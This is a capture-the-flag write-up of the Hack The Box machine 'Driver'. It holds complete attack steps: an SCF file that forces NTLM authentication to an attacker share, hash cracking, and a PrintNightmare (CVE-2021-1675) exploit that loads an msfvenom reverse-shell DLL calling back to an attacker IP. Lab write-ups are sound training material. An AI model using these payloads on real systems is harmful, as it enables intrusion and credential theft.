## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)
### Recon
```bash
nmap -p- -T4 10.10.11.106
nmap -sC -sV -p80,135,445 10.10.11.106
```
- Port [80](HTTP): IIS HTTP, basic auth prompt ("MFP Firmware Update Center")
- Port 135/[445](SMB): Typical Windows services
- `/etc/hosts` entry: `10.10.11.106 driver.htb`

### Web Brute-force
```bash
nmap -p80 --script http-brute 10.10.11.106
```
- **Found**: admin:admin
- Firmware upload page (printer model Ricoh)

### Forced Authentication (Responder Attack)
**SCF Payload**:
```ini
[Shell]
Command=2
IconFile=\\10.10.14.131\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```
- Upload `.scf` via firmware update
- Start Responder:
```bash
sudo responder -I tun0 -A
```
- Captured NTLMv2 hash for user `tony`

### Crack NTLMv2 with Hashcat
```bash
hashcat -m5600 captured-hashes.txt /usr/share/wordlists/rockyou.txt --force
```
- **Cracked**: `tony:liltony`

### Access with Evil-WinRM
```bash
evil-winrm -i 10.10.11.106 -u 'DRIVER\\tony' -p 'liltony'
```
- Retrieved `user.txt`

### Enumeration for Privilege Escalation
```powershell
schtasks /query /fo LIST /v > lst.txt
```
- Found job: `C:\Users\tony\appdata\local\job\job.bat`
```bat
@echo off
:LOOP
%SystemRoot%\explorer.exe "C:\firmwares"
ping -n 20 127.0.0.1 > nul && powershell -ep bypass c:\users\tony\appdata\local\job\quit.ps1
DEL /q C:\firmwares\*
cls
GOTO :LOOP
```
- `quit.ps1` closes file explorer window if folder is open

### PrintNightmare Exploit (CVE-2021-1675)
```bash
git clone https://github.com/cube0x0/CVE-2021-1675
cd CVE-2021-1675
```
- Generate reverse shell DLL:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.216 LPORT=4444 -f dll > shell-x64.dll
```
- Configure and start Samba:
```ini
[smb]
    path = /tmp
    guest ok = yes
    read only = no
    browsable = yes
```
```bash
cp shell-x64.dll /tmp/
sudo service smbd start
```
- Patch impacket:
```bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 setup.py install
```
- Run exploit:
```bash
python3 CVE-2021-1675.py DRIVER/tony:liltony@10.10.11.106 \\10.10.14.216\smb\shell-x64.dll
```
- **Catch shell**:
```bash
nc -nvlp 4444
```

### Privilege Escalation
```bash
whoami
# nt authority\system
cat C:\Users\Administrator\Desktop\root.txt
```

### Summary
- Initial foothold through default creds on printer firmware page
- Forced authentication with `.scf` file to capture NTLM hash
- Used Evil-WinRM with cracked creds
- Privilege escalation using PrintNightmare exploit
- Full SYSTEM access achieved